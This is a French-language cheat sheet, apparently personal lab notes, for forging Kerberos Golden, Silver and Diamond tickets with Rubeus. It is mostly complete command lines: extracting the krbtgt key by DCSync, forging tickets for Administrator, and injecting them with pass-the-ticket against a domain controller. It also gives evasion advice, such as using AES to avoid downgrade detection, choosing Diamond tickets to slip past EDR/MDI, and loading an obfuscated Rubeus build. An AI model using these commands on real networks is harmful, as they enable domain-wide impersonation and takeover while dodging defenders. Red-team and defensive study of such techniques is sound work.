# Cheatsheet - Tickets Kerberos (Golden / Silver / Diamond)

> [!summary] Objectif
> Forger un ticket Kerberos pour usurper une identité sans repasser par le KDC (Golden, Silver) ou en repartant d'un TGT réel (Diamond, plus furtif). Le lab charge Rubeus via `Loader.exe` (build obfusqué `evasive-*`).

### Golden Ticket — clé krbtgt, tout le domaine
```powershell
Rubeus.exe dcsync /user:<DOMAIN>\krbtgt                                             # 1. clé krbtgt
Rubeus.exe golden /aes256:<krbtgt_aes256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
Rubeus.exe golden <champs imprimés par /printcmd> /ptt                              # forger + injecter
```
Utiliser `/aes256`, pas `/rc4` (downgrade détectable). `/ldap` remplit le PAC via 3 requêtes au DC pour un ticket cohérent. Un reset du mot de passe `krbtgt` **×2** invalide le ticket.

### Silver Ticket — hash du service, un seul service/hôte
```powershell
Rubeus.exe silver /service:http/<DC_FQDN> /rc4:<machine_hash> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN> /ptt
# WMI nécessite deux tickets : HOST puis RPCSS
Rubeus.exe silver /service:host/<DC_FQDN>  /rc4:<machine_hash> ... /ptt
Rubeus.exe silver /service:rpcss/<DC_FQDN> /rc4:<machine_hash> ... /ptt
```
Jamais de contact KDC → plus furtif que Golden, mais périmètre limité à 1 service. Le ticket porte le FQDN du service : cibler `winrs -r:<DC_FQDN>`, pas le nom court.

### Diamond Ticket — TGT réel, PAC re-signé
```powershell
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /domain:<DOMAIN> /dc:<DC_FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Même prérequis que Golden (clé `krbtgt`), mais le TGT de base est authentique — seul le PAC est modifié. Préférable si un EDR/MDI surveille les tickets forgés from-scratch.

> [!note] Comparatif — Golden : clé krbtgt, tout le domaine, aucun contact KDC. Silver : hash du service, 1 service, aucun contact KDC. Diamond : clé krbtgt sur un vrai TGT, tout le domaine, contacte le KDC mais reste le plus furtif des trois.

**Link** — [[Cheatsheet - Kerberoasting]] · [[Cheatsheet - AS-REP Roasting]] · [[Cheatsheet - Persistence]] · [[Synthèse - Kerberos]]
